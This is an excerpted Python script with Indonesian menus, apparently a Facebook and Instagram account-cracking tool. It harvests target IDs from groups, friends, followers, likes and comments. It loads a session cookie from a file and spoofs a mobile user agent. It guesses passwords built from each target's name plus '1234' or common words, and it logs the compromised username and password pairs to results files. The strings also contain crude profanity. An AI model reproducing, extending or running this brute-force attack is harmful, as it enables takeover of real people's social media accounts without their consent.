...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print(' [%s✓%s] Total Akun \x1b[0;92mOK \x1b[0;97m: %s%s%s'%(O,N,H,str(len(ok)),N))
        print(' [%sX%s] Total Akun \x1b[0;93mCP \x1b[0;97m: %s%s%s'%(O,N,K,str(len(cp)),N))
...
def moch_yayan():
    ...
    try:
        ...
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
    IP = requests.get('https://ip-api.com').text
    _mmk_ = open('.cokie.txt').read()
    kueh  = {"cookie":_mmk_}
    print("\x1b[1;97m╔══════════════════════════════════════]");time.sleep(0.03)
    print("\x1b[1;97m╠══[\x1b[1;91m [\x1b[1;92m•\x1b[1;91m]\x1b[1;93m Your IP\x1b[1;97m   :\x1b[1;92m %s"%(IP));time.sleep(0.03)
    print("\x1b[1;97m╠══[\x1b[1;91m [\x1b[1;92m•\x1b[1;91m]\x1b[1;93m Your Name\x1b[1;97m :\x1b[1;92m %s%s%s"%(H,nama,N));time.sleep(0.03)
    print("\x1b[1;97m║");time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s01%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96mid dari \x1b[1;97manggota grup'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s02%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96mid dari \x1b[1;97mteman publik'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s03%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96mid dari \x1b[1;97mtotal followers'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s04%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96mid dari \x1b[1;97mlike postingan'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s05%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96mid dari \x1b[1;97mrandom id massal'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s06%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96mid dari \x1b[1;97mkomentar postingan'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s07%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCrack \x1b[1;96makun \x1b[1;97minstagram \x1b[1;91m[%snew%s\x1b[1;91m]'%(O,N,H,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s08%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCheckpoint \x1b[1;96mDetector'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s09%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mSettings \x1b[1;97muser \x1b[1;96magent'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s10%s\x1b[1;91m]\x1b[1;97m. \x1b[1;93mCheck \x1b[1;97mhasil \x1b[1;96mcrack'%(O,N));time.sleep(0.03)
    print('\x1b[1;97m╠══[ \x1b[1;91m[%s00%s\x1b[1;91m]\x1b[1;97m. \x1b[1;97mlogout \x1b[1;92m[%sAhh Ngecrot%s\x1b[1;92m]'%(H,N,K,N));time.sleep(0.03)
    print('\x1b[1;97m║');time.sleep(0.03)
    pepek = input('\x1b[1;97m╠══[ [%s*%s] menu : '%(H,N))
    if pepek == '':
...
def gabut():
    ...
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f" [{H}•{N}] contoh password : {H}yumasaa{N}")
        pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
        else:
...
class __crack__:
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write('\r \x1b[0;96m[\x1b[0;97m%s%s%s\x1b[0;96m][\x1b[0;97mKENTOD\x1b[0;96m][%s/%s\x1b[0;96m][\x1b[0;97mOKEH:%s\x1b[0;96m][\x1b[0;97mCEPEH:%s\x1b[0;96m]'%(H,i,N,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            ...
            try:
                ...
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36;]'
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    pass
                print('\r %s[CP] %s • %s                %s' % (O,user,pw,N))
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                ...
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"1234", xz[0]+"12345", "sayang", "anjing", "kontol"]
                        else:
                            pwx = [name, xz[0]+"1234", xz[0]+"12345", "sayang", "anjing", "kontol"]
...
def crack2(user, pwx):
    ...
    for pas in pwx:
        if looping != 1:
            ...
            if len(status_foll) != 1:
                sys.stdout.write('\r \x1b[0;96m[%s%s%s\x1b[0;96m][\x1b[0;97mKENTOD\x1b[0;96m][%s/%s\x1b[0;96m][\x1b[0;97mOKEH:%s\x1b[0;96m][\x1b[0;97mCEPEH:%s\x1b[0;96m]'%(H,i,N,loop,len(self.id),len(ok),len(cp))),
                sys.stdout.flush()
                asww -= 1
            else:
                pass
